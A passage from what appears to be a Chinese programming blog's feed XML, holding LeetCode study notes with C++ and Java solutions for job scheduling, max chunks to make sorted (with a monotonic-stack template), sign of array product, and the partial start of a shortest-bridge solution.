class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">jobScheduling</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; startTime, vector&lt;<span class="type">int</span>&gt;&amp; endTime, vector&lt;<span class="type">int</span>&gt;&amp; profit)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = startTime.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">index</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            index[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(index.<span class="built_in">begin</span>(), index.<span class="built_in">end</span>(), [&amp;](<span class="type">int</span> a, <span class="type">int</span> b)-&gt;<span class="type">bool</span> &#123;<span class="keyword">return</span> endTime[a] &lt; endTime[b];&#125;);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> j = index[i<span class="number">-1</span>];</span><br><span class="line">            <span class="type">int</span> k = i<span class="number">-2</span>;</span><br><span class="line">            <span class="keyword">for</span>(; k &gt;= <span class="number">0</span>; k--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(endTime[index[k]] &lt;= startTime[j]) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>], dp[k+<span class="number">1</span>] + profit[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>开始想用贪心，给时薪排序，一次选择，但是发现这样得到的不是profit最大，而是工作时间更短的情况下的收益最大<br>看了答案后自己写的，发现是一个非常典型的dp问题</p></blockquote><h3 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">jobScheduling</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;startTime, vector&lt;<span class="type">int</span>&gt; &amp;endTime, vector&lt;<span class="type">int</span>&gt; &amp;profit)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = startTime.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">jobs</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            jobs[i] = &#123;startTime[i], endTime[i], profit[i]&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(jobs.<span class="built_in">begin</span>(), jobs.<span class="built_in">end</span>(), [](<span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp;job1, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp;job2) -&gt; <span class="type">bool</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> job1[<span class="number">1</span>] &lt; job2[<span class="number">1</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> k = <span class="built_in">upper_bound</span>(jobs.<span class="built_in">begin</span>(), jobs.<span class="built_in">begin</span>() + i - <span class="number">1</span>, jobs[i - <span class="number">1</span>][<span class="number">0</span>], [&amp;](<span class="type">int</span> st, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp;job) -&gt; <span class="type">bool</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> st &lt; job[<span class="number">1</span>];</span><br><span class="line">            &#125;) - jobs.<span class="built_in">begin</span>();</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>], dp[k] + jobs[i - <span class="number">1</span>][<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="复习-769-最多能完成排序的块"><a href="#复习-769-最多能完成排序的块" class="headerlink" title="复习 769. 最多能完成排序的块"></a>复习 <a href="https://leetcode.cn/problems/max-chunks-to-make-sorted/">769. 最多能完成排序的块</a></h2><p>这个题之前没有看太懂，现在再看一次</p><h3 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxChunksToSorted</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length, ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>, min = n, max = -<span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            min = Math.min(min, arr[i]);</span><br><span class="line">            max = Math.max(max, arr[i]);</span><br><span class="line">            <span class="keyword">if</span> (j == min &amp;&amp; i == max) &#123;</span><br><span class="line">                ans++; j = i + <span class="number">1</span>; min = n; max = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：AC_OIer</span><br><span class="line">链接：https:<span class="comment">//leetcode.cn/problems/max-chunks-to-make-sorted/solution/by-ac_oier-4uny/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure><blockquote><p>这个题解比官方的好理解一点，j比i落后一点<br>当i，j区间内拥有i，j两个数时，且i是最大值，j的最小值，这时对这个区间排序，可以让max &#x3D; i到i的位置，min &#x3D; j到j的位置<br>也就是说i，j区间内所有数字都找到了自己的位置。这就找到了一个划分，重复这样做，就可以找到所有区间</p></blockquote><h3 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxChunksToSorted</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> v : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (stk.<span class="built_in">empty</span>() || v &gt;= stk.<span class="built_in">top</span>()) &#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(v);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> mx = stk.<span class="built_in">top</span>();</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() &amp;&amp; stk.<span class="built_in">top</span>() &gt; v) &#123;</span><br><span class="line">                    stk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                stk.<span class="built_in">push</span>(mx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">作者：lcbin</span><br><span class="line">链接：https:<span class="comment">//leetcode.cn/problems/max-chunks-to-make-sorted/solution/by-lcbin-jgrv/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure><blockquote><p>以数据</p></blockquote><h4 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h4><p>单调栈：分为单调递增和单调递减栈(栈内元素成递增或者递减性)</p><ul><li><p>单调栈的作用</p><ul><li>把序列中每个元素放到单调栈中进行维护就可以在 O(n) 的时间复杂度内求出区间每个元素为最大值&#x2F;最小值时</li></ul></li><li><p>单调栈的性质如下：</p><ul><li>元素加入栈前会把栈顶破坏单调性的元素删除</li><li>一般使用单调栈的题目具有以下的两点<ul><li>离自己最近（栈的后进先出的性质）</li><li>比自己大（小）、高(低)</li></ul></li></ul></li></ul><p>板子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line"><span class="keyword">for</span> (遍历这个数组)&#123;</span><br><span class="line">   <span class="keyword">if</span> (栈空 || 栈顶元素大于等于当前比较元素)&#123;</span><br><span class="line">       入栈;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (栈不为空 &amp;&amp; 栈顶元素小于当前元素)&#123;</span><br><span class="line">            栈顶元素出栈;</span><br><span class="line">            更新结果;</span><br><span class="line">        &#125;</span><br><span class="line">        当前数据入栈;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1822-数组元素积的符号"><a href="#1822-数组元素积的符号" class="headerlink" title="1822. 数组元素积的符号"></a><a href="https://leetcode.cn/problems/sign-of-the-product-of-an-array/">1822. 数组元素积的符号</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">arraySign</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> ret = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n&lt;<span class="number">0</span>) &#123;</span><br><span class="line">                ret=!ret;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret?<span class="number">-1</span>:<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>比较简单，就是数数的问题</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;934-最短的桥&quot;&gt;&lt;a href=&quot;#934-最短的桥&quot; class=&quot;headerlink&quot; title=&quot;934. 最短的桥&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/shortest-bridge/&quot;&gt;934. 最短的桥&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; indexMap[&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;][&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;; &lt;span class=&quot;comment&quot;&gt;//岛屿点，对应一个岛&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; edgex[&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; edgey[&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; edgei[&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; edgej[&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; edgecount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; edgeicount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;shortestBridge&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt;&amp;amp; grid)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        n = grid.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; islandCount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; p1x,p1y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; n; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(grid[i][j] == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; indexMap[i][j] == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    ++islandCount;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(grid, i, j, islandCount);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; min=INT_MAX;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; edgecount; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; edgeicount; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; path = &lt;span class=&quot;built_in&quot;&gt;abs&lt;/span&gt;(edgex[i]-edgei[j]) + &lt;span class=&quot;built_in&quot;&gt;abs&lt;/span&gt;(edgey[i] - edgej[j]) - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(min &amp;gt;= path) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    min = path;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; min;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;dfs&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt;&amp;amp; grid, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; y, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; index)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(x &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || y &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || x &amp;gt;= n || y &amp;gt;= n) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(indexMap[x][y] != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || grid[x][y] != &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        indexMap[x][y] = index;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag = (y&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt; &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; grid[x][y&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) || (y+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;lt; n &amp;amp;&amp;amp; grid[x][y+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) || (x+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;lt; n &amp;amp;&amp;amp; grid[x+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;][y] == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) || (x&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt; &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; grid[x&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;][y] == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(grid, x, y&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;, index);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(grid, x, y+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, index);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(grid, x+&lt;span 